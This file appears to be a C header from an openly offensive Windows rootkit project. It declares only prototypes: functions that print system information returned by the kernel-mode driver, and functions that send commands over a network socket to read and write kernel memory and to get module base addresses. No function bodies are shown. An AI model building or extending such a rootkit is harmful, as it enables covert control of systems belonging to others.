#pragma once
#include "structs.h"
#include "internet.h"


/*
==================================================
PARSING DATA AND BUFFERS USED FOR DIFFERENT STUFF:
==================================================
*/


// Parsing ROOTKIT_STATUS return status:
void PrintStatusCode(ROOTKIT_STATUS status_code);


// Parsing data and buffers returned from system information requests:
void GetBufferValue(PVOID Src, PVOID Dst, SIZE_T Size);
void PrintRegistryData(PVOID RegData, ULONG64 EntrySize);
void PrintBasicSystemInfo(PVOID BasicInfo, ULONG64 EntrySize);
void PrintSystemPerformanceInfo(PVOID PerfInfo, BOOL Verbose, ULONG64 EntrySize);
void PrintTimeOfDayInfo(PVOID TimeOfDayInfo, ULONG64 EntrySize);
void PrintWorkingProcessesInfo(PVOID CurrentProcInfo, ULONG64 EntrySize);
void PrintCpuPerformanceInfo(PVOID CpuInf, ULONG64 EntrySize);
void PrintInterruptInfo(PVOID IntInf, ULONG64 EntrySize);
void PrintExceptionInfo(PVOID ExcInf, ULONG64 EntrySize);
void PrintModulesInfo(PVOID MdlInf, ULONG64 EntrySize);
void PrintLookasideInfo(PVOID LookasdInfo, ULONG64 EntrySize);
void PrintCodeIntgrInfo(PVOID CodeintgrInfo, ULONG64 EntrySize);
void PrintPolicyInfo(PVOID PolicyInfo, ULONG64 EntrySize);
void PrintSystemInformation(PVOID Response, char c, ULONG64 status, DWORD n, ULONG64 Size);



/*
========================================================================
PASSING THE MAIN STRUCT AND HANDLING DIFFERENT REQUESTS FOR THE ROOTKIT:
========================================================================
*/


BOOL PassArgs(ROOTKIT_MEMORY* Rootinst, SOCKET tosock, BOOL Retrieve);
ULONG64 GetModuleBaseAddress(const char* ModuleName, SOCKET tosock);
BOOL DisplayStringFromKMD(const char* Message, SOCKET tosock, const char* ModuleName);
bool ReadFromRootkKMD(PVOID ReadAddress, PVOID DstBuffer, ULONG64 BufferSize, const char* ModuleName, SOCKET tosock);
bool WriteToRootkKMD(PVOID WriteAddress, PVOID SrcBuffer, ULONG WriteSize, const char* ModuleName, const char* SemiMdl, SOCKET tosock);
BOOL ValidateInfoTypeString(const char* InfoType);
SYSTEM_INFORMATION_CLASS ReturnSystemInfo(char InfoType);
BOOL GetSystemInformation(const char* InfoTypes, SOCKET tosock, ROOTKIT_MEMORY* RootkInstructions, const char* ModuleName);
